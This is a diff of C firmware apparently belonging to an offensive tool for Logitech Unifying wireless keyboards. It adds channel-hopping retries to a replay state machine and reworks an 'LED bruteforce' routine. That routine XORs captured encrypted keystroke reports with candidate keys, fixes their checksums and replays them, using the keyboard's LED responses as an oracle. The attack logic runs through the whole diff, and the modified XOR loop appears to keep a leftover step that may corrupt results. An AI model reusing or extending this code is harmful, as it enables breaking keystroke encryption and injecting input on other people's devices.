@@ -436,13 +436,15 @@ void process_next_replay_step(replay_event_t replay_event) {
         case REPLAY_EVENT_TX_FAILED:
         {
             // change to next channel and transmit again
-
+            NRF_LOG_INFO("Replay: TX failed, trying next channel...");
+            radioNextRfChannel();
+            nrf_esb_start_tx();
             // if all channels failed, change state to replay failed
-
+/*
             // TEST abort replay
             m_replay_state.substate = REPLAY_SUBSTATE_REPLAY_FAILED;
             NRF_LOG_INFO("Replay: transmission failed (timestamp %d)", timestamp_get());
-            
+*/            
         }
         break;
         case REPLAY_EVENT_TIMER:
@@ -539,7 +541,8 @@ void process_next_replay_step(replay_event_t replay_event) {
                 }
 
                 m_replay_state.p_record_set->disallowWrite = m_replay_state.record_buffer_was_write_protected_before_replay; //restore write permission of record buffer
-
+                m_replay_state.running = false;
+ 
                 // send event
                 if (m_state_local.event_handler != NULL) {
                     event.evt_id = UNIFYING_EVENT_REPLAY_RECORDS_FINISHED;
@@ -547,7 +550,6 @@ void process_next_replay_step(replay_event_t replay_event) {
                     m_state_local.event_handler(&event);
                 } 
 
-                m_replay_state.running = false;
                 return;
             }
 
@@ -572,14 +574,14 @@ void process_next_replay_step(replay_event_t replay_event) {
         }
         
         m_replay_state.p_record_set->disallowWrite = m_replay_state.record_buffer_was_write_protected_before_replay; //restore write permission of record buffer
-
+        m_replay_state.running = false;
         NRF_LOG_INFO("Replay frame transmit failed (timestamp %d)", timestamp_get());
         if (m_state_local.event_handler != NULL) {
             event.evt_id = UNIFYING_EVENT_REPLAY_RECORDS_FAILED;
             event.pipe = m_replay_state.pipe_num;
             m_state_local.event_handler(&event);
         } 
-        m_replay_state.running = false;
+        
 
 
     }
@@ -593,6 +595,24 @@ void process_next_replay_step(replay_event_t replay_event) {
 #define UNIFYING_ENCRYPTED_KEY_REPORT_OFFSET_KEY5 7
 #define UNIFYING_ENCRYPTED_KEY_REPORT_OFFSET_KEY6 8
 
+#define XOR_BRUTEFORCE_FIRST_HID_CODE 0x04
+#define XOR_BRUTEFORCE_LAST_HID_CODE 0x65
+#define XOR_BRUTEFORCE_HID_CODE_RANGE ((XOR_BRUTEFORCE_LAST_HID_CODE-XOR_BRUTEFORCE_FIRST_HID_CODE)+1)
+
+
+uint8_t xor_key(uint8_t iteration_num) {
+    // account for key HID code 0x04 to 0x65 (0x00 to 0x65 are usage IDs for a boot compatible HID keyboard descriptor, as shown 
+    // in Appendix E.6 of "Device Class Definition for Human Interface Devices (HID) Version 1.11")
+
+    // clamp to keyspace 0x04..0x65
+    uint8_t result = iteration_num % XOR_BRUTEFORCE_HID_CODE_RANGE;
+    result += XOR_BRUTEFORCE_FIRST_HID_CODE;
+
+    // XOR with CAPS LOCK (raise chance of hitting an LED)
+    result ^= 0x39;
+    return result;
+}
+
 void unifying_replay_records_LED_bruteforce_iteration(uint8_t pipe_num) {
     
     unifying_rf_record_set_t * p_rs = &m_state_local.record_sets[pipe_num];
@@ -601,9 +621,12 @@ void unifying_replay_records_LED_bruteforce_iteration(uint8_t pipe_num) {
     if (end_pos >= UNIFYING_MAX_STORED_REPORTS_PER_PIPE) end_pos -= UNIFYING_MAX_STORED_REPORTS_PER_PIPE;
     int read_length = start_pos < end_pos ? end_pos - start_pos : (end_pos + UNIFYING_MAX_STORED_REPORTS_PER_PIPE) - start_pos;
 
-    uint8_t next_xor_key = p_rs->XOR_key_for_LED_brute_force + 1;
+    
+    uint8_t last_xor_key = p_rs->XOR_key_for_LED_brute_force == 0 ? 0x00 : xor_key(p_rs->XOR_key_for_LED_brute_force - 1);
+    uint8_t current_xor_key = xor_key(p_rs->XOR_key_for_LED_brute_force);
+    // for very first iteration, 'last_xor_key' is cleared, as there's nothing to revert
 
-    NRF_LOG_INFO("Modifying reports for pipe %d with XOR key %02x", pipe_num, next_xor_key);
+    NRF_LOG_INFO("Modifying reports for pipe %d with XOR key %02x", pipe_num, current_xor_key);
 
     uint8_t with_led_count = 0;
     for (uint8_t i = 0; i<read_length; i++) {
@@ -615,16 +638,17 @@ void unifying_replay_records_LED_bruteforce_iteration(uint8_t pipe_num) {
         // (only for key down)
         if (!p_record->isEncrytedKeyRelease) { // is key down
             if (!p_record->resulted_in_LED_report) { // didn't result in LED report
+                
+
                 uint8_t key1 = p_record->data[UNIFYING_ENCRYPTED_KEY_REPORT_OFFSET_KEY1];
                 key1 ^= p_rs->XOR_key_for_LED_brute_force; // remove previous XOR key
-                key1 ^= next_xor_key; //apply new XOR key
-                key1 ^= 0x04; // remove previous XOR key
-                key1 ^= 0x39; //apply new XOR key
+                key1 ^= last_xor_key; // remove previous XOR key
+                key1 ^= current_xor_key; //apply new XOR key
                 p_record->data[UNIFYING_ENCRYPTED_KEY_REPORT_OFFSET_KEY1] = key1; // assign
 
                 // recalculate Logitech checksum
                 unifying_payload_update_checksum(p_record->data, p_record->length);
-                NRF_LOG_INFO("pos %d XOR modified", read_pos);
+                NRF_LOG_INFO("pos %d XOR modified with %02x", read_pos, current_xor_key);
             } else {
                 with_led_count++;
                 NRF_LOG_INFO("pos %d not XOR modified", read_pos);
@@ -645,6 +669,10 @@ void unifying_replay_records_LED_bruteforce_iteration(uint8_t pipe_num) {
 
     // advance XOR key
     p_rs->XOR_key_for_LED_brute_force++;
+}
+
+bool unifying_replay_records_LED_bruteforce_done(uint8_t pipe_num) {
+    return m_state_local.record_sets[pipe_num].all_encrypted_reports_produce_LED_reports;
 }
 
 // returns true if the given esb event was consumed by unifying module
